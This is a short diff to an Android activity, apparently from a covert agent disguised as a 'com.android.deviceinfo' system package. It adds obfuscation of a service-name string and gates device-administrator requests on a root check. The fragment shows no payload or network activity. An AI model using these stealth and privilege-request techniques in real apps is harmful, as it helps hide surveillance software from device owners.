@@ -23,6 +23,7 @@ import android.widget.TextView;
 import com.android.deviceinfo.Core;
 import com.android.deviceinfo.Device;
 import com.android.deviceinfo.R;
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.capabilities.PackageInfo;
@@ -108,7 +109,7 @@ public class AGUI extends Activity {
 	}
 
 	private void startExtService() {
-		final String service = "com.android.deviceinfo.app"; //$NON-NLS-1$
+		final String service = M.e("com.android.deviceinfo.app"); //$NON-NLS-1$
 
 		try {
 			if (Core.isServiceRunning() == false) {
@@ -186,8 +187,8 @@ public class AGUI extends Activity {
 	}
 
 	public void deviceAdminRequest() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (deviceAdminRequest) ");
+		if (Root.shouldAskForAdmin() == false) {
+			return;
 		}
 		
 		handler.postDelayed(new Runnable() {
@@ -195,7 +196,7 @@ public class AGUI extends Activity {
 			@Override
 			public void run() {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (run) fireAdminIntent");
+					Check.log(TAG + " (deviceAdminRequest run) fireAdminIntent");
 				}
 
 				fireAdminIntent();
